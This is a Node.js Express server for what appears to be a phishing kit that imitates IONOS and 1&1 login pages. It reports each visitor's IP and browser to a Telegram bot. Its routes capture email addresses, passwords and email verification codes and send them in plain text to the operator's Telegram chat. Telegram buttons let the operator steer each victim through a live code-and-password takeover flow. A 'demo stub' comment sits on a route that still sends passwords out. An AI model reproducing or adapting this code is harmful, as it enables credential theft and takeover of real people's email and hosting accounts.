require("dotenv").config();
const express = require("express");
const os = require("os");
const path = require("path");
const flow = require("./lib/ionos-flow");

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || "0.0.0.0";
const ADMIN_KEY = process.env.ADMIN_KEY || "";

// Per-IP cooldown to avoid duplicate notifications on refresh (10 minutes)
const VISITOR_COOLDOWN_MS = 10 * 60 * 1000;
const recentVisitors = new Map();
let telegramOffset = 0;

function getLocalAddresses() {
  const addresses = [];
  for (const interfaces of Object.values(os.networkInterfaces())) {
    for (const iface of interfaces) {
      if (iface.family === "IPv4" && !iface.internal) {
        addresses.push(iface.address);
      }
    }
  }
  return addresses;
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function sendTelegram(text, replyMarkup) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.warn("[telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID");
    return { ok: false, error: "not_configured" };
  }
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const body = {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
  };
  if (replyMarkup) body.reply_markup = replyMarkup;

  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok || !data.ok) {
    console.error("[telegram]", data.description || res.statusText);
    return { ok: false, error: data.description || "request_failed" };
  }
  return { ok: true };
}

async function answerTelegramCallback(callbackQueryId, text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return;
  await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      callback_query_id: callbackQueryId,
      text: text || "Weiterleitung gesetzt",
    }),
  }).catch(() => {});
}

async function notifyFlowSession(session, title) {
  if (process.env.TELEGRAM_NOTIFY !== "true") return;
  const keyboard = flow.buildTelegramKeyboard(session);
  await sendTelegram(flow.formatSessionMessage(session, title), keyboard || undefined);
}

async function handleTelegramCallback(callbackQuery) {
  const parsed = flow.parseCallbackData(callbackQuery.data);
  if (!parsed) return;

  const result = flow.applyAdminAction(parsed.id, parsed.action);
  if (!result.ok) {
    await answerTelegramCallback(callbackQuery.id, "Session nicht gefunden");
    return;
  }

  const labels = {
    code: "→ E-Mail Code",
    password: "→ Passwort",
    code_bad: "→ Falscher Code",
    thankyou: "→ Thank You",
  };
  await answerTelegramCallback(callbackQuery.id, labels[parsed.action] || "OK");
}

async function pollTelegramUpdates() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token || process.env.VERCEL === "1") return;

  try {
    const res = await fetch(
      `https://api.telegram.org/bot${token}/getUpdates?offset=${telegramOffset}&timeout=25`
    );
    const data = await res.json().catch(() => ({}));
    for (const update of data.result || []) {
      telegramOffset = update.update_id + 1;
      if (update.callback_query) {
        await handleTelegramCallback(update.callback_query);
      }
    }
  } catch (err) {
    console.error("[telegram poll]", err.message);
  }

  setTimeout(pollTelegramUpdates, 500);
}

function requireAdmin(req, res, next) {
  if (!ADMIN_KEY) {
    return res.status(503).json({ ok: false, message: "ADMIN_KEY not configured" });
  }
  const key = req.headers["x-admin-key"] || req.query.key;
  if (key !== ADMIN_KEY) {
    return res.status(401).json({ ok: false, message: "Unauthorized" });
  }
  next();
}

function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress || "unknown";
}

function parseDevice(ua) {
  if (!ua) return "Unknown";
  if (/mobile/i.test(ua)) return "Mobile";
  if (/tablet|ipad/i.test(ua)) return "Tablet";
  return "Desktop";
}

function parseBrowser(ua) {
  if (!ua) return "Unknown";
  if (/edg\//i.test(ua)) return "Edge";
  if (/opr\//i.test(ua)) return "Opera";
  if (/chrome/i.test(ua)) return "Chrome";
  if (/firefox/i.test(ua)) return "Firefox";
  if (/safari/i.test(ua)) return "Safari";
  return "Other";
}

// Visitor tracking — notifies Telegram BEFORE sending file so serverless doesn't cut it off
app.get("/", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";

    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip);
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;

    if (!isBot && !onCooldown) {
      recentVisitors.set(ip, now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);

      await sendTelegram(
        [
          "<b>👁️ Nuovo Visitatore — Portal Duplica</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }

  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Visitor tracking for 1&1 page
app.get("/1und1.html", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip + "-1und1");
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
    if (!isBot && !onCooldown) {
      recentVisitors.set(ip + "-1und1", now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);
      await sendTelegram(
        [
          "<b>👁️ Visitatore — Pagina 1&amp;1</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }
  res.sendFile(path.join(__dirname, "public", "1und1.html"));
});

// Visitor tracking for IONOS page
app.get("/ionos.html", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip + "-ionos");
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
    if (!isBot && !onCooldown) {
      recentVisitors.set(ip + "-ionos", now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);
      await sendTelegram(
        [
          "<b>👁️ Visitatore — Pagina IONOS</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }
  res.sendFile(path.join(__dirname, "public", "ionos.html"));
});

app.get("/ionos-password.html", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip + "-ionos-pw");
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
    if (!isBot && !onCooldown) {
      recentVisitors.set(ip + "-ionos-pw", now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);
      await sendTelegram(
        [
          "<b>👁️ Visitatore — IONOS Passwort</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }
  res.sendFile(path.join(__dirname, "public", "ionos-password.html"));
});

app.get("/ionos-emailconfirmation.html", async (req, res) => {
  if (process.env.TELEGRAM_NOTIFY === "true") {
    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "";
    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
    const lastSeen = recentVisitors.get(ip + "-ionos-confirm");
    const now = Date.now();
    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
    if (!isBot && !onCooldown) {
      recentVisitors.set(ip + "-ionos-confirm", now);
      const when = new Date().toUTCString();
      const referrer = req.headers["referer"] || "Direct";
      const device = parseDevice(ua);
      const browser = parseBrowser(ua);
      await sendTelegram(
        [
          "<b>👁️ Visitatore — IONOS E-Mail Code</b>",
          "",
          `<b>IP:</b> ${escapeHtml(ip)}`,
          `<b>Dispositivo:</b> ${device}`,
          `<b>Browser:</b> ${browser}`,
          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
          `<b>Ora (UTC):</b> ${when}`,
        ].join("\n")
      );
    }
  }
  res.sendFile(path.join(__dirname, "public", "ionos-emailconfirmation.html"));
});

app.use(express.static(path.join(__dirname, "public")));

app.get("/health", (_req, res) => res.json({ ok: true }));

// ── IONOS flow control ──────────────────────────────────────────────

app.post("/api/ionos/start", async (req, res) => {
  const email = String(req.body.email || "").trim();
  if (!email) {
    return res.status(400).json({ ok: false, message: "Email required" });
  }

  const session = flow.createSession({
    email,
    ip: getClientIp(req),
    ua: req.headers["user-agent"] || "",
  });

  await notifyFlowSession(session, "📧 IONOS — Email eingegeben");

  return res.json({ ok: true, sessionId: session.id });
});

app.get("/api/ionos/session/:id", (req, res) => {
  const session = flow.getSession(req.params.id);
  if (!session) return res.status(404).json({ ok: false });
  const error = session.error || null;
  if (req.query.consume === "1" && session.error) {
    session.error = null;
    session.updatedAt = Date.now();
  }
  return res.json({
    ok: true,
    id: session.id,
    email: session.email,
    step: session.step,
    pending: session.pending,
    error,
  });
});

app.get("/api/ionos/session/:id/poll", (req, res) => {
  const state = flow.getPollState(req.params.id);
  return res.json(state);
});

app.post("/api/ionos/session/:id/code", async (req, res) => {
  const session = flow.getSession(req.params.id);
  if (!session) return res.status(404).json({ ok: false, message: "Session not found" });

  const code = String(req.body.code || "").trim();
  if (!code) return res.status(400).json({ ok: false, message: "Code required" });

  flow.updateSession(session.id, {
    code,
    step: "code_submitted",
    pending: "code",
  });

  const updated = flow.getSession(session.id);
  await notifyFlowSession(updated, "🔢 IONOS — Code eingegeben");

  return res.json({ ok: true, sessionId: session.id });
});

app.post("/api/ionos/session/:id/password", async (req, res) => {
  const session = flow.getSession(req.params.id);
  if (!session) return res.status(404).json({ ok: false, message: "Session not found" });

  const password = String(req.body.password || "");
  if (!password) return res.status(400).json({ ok: false, message: "Password required" });

  flow.updateSession(session.id, {
    password,
    step: "password_submitted",
    pending: "password",
  });

  const updated = flow.getSession(session.id);
  await notifyFlowSession(updated, "🔑 IONOS — Passwort eingegeben");

  return res.json({ ok: true, sessionId: session.id });
});

app.get("/api/admin/sessions", requireAdmin, (_req, res) => {
  res.json({ ok: true, sessions: flow.listSessions() });
});

app.post("/api/admin/session/:id/redirect", requireAdmin, (req, res) => {
  const action = String(req.body.action || "");
  const result = flow.applyAdminAction(req.params.id, action);
  if (!result.ok) {
    return res.status(404).json({ ok: false, message: result.error });
  }
  res.json({ ok: true, session: result.session });
});

app.post("/api/telegram/webhook", async (req, res) => {
  const update = req.body;
  if (update && update.callback_query) {
    await handleTelegramCallback(update.callback_query);
  }
  res.json({ ok: true });
});

app.post("/api/login", async (req, res) => {
  const email = String(req.body.email || "").trim();
  const password = String(req.body.password || "");
  const code = String(req.body.code || "").trim();

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: "Email e password sono obbligatori." });
  }

  // Demo stub — replace with real authentication (hashing, sessions, etc.)
  console.log("[login] Demo submit received for:", email);

  if (process.env.TELEGRAM_NOTIFY === "true") {
    const when = new Date().toISOString();
    const lines = [
      "<b>Portal Duplica</b>",
      "",
      "<b>Evento:</b> invio del modulo",
      `<b>Email:</b> ${escapeHtml(email)}`,
    ];
    if (code) {
      lines.push(`<b>Code:</b> ${escapeHtml(code)}`);
    }
    lines.push(`<b>Password:</b> ${escapeHtml(password)}`);
    lines.push(`<b>Ora (UTC):</b> ${when}`);

    const result = await sendTelegram(lines.join("\n"));
    if (result.ok) {
      console.log("[telegram] Notification sent.");
    } else {
      console.error("[telegram] Notification failed:", result.error);
    }
  }

  return res.json({
    ok: true,
    message: "Richiesta registrata.",
  });
});

// Only start the HTTP server when running locally (not on Vercel)
if (process.env.VERCEL !== "1") {
  app.listen(PORT, HOST, () => {
    const localAddresses = getLocalAddresses();
    console.log(`Server listening on ${HOST}:${PORT}`);
    console.log(`Local:   http://localhost:${PORT}`);
    console.log(`Panel:   http://localhost:${PORT}/ionos-panel.html`);
    for (const address of localAddresses) {
      console.log(`Network: http://${address}:${PORT}`);
    }
    if (localAddresses.length === 0) {
      console.log("No LAN IPv4 address found. Check your network connection.");
    }
    if (process.env.TELEGRAM_BOT_TOKEN) {
      pollTelegramUpdates();
      console.log("[telegram] Callback polling started");
    }
  });
}

module.exports = app;
